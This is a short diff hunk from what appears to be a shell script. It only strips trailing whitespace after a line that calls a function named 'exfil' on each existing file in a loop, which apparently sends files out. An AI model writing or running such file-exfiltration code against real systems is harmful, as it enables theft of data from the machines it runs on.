@@ -32,7 +32,7 @@ do
     then
     if [ -f $file ]
       then
-        exfil $file 
+        exfil $file
       fi
     fi
 done
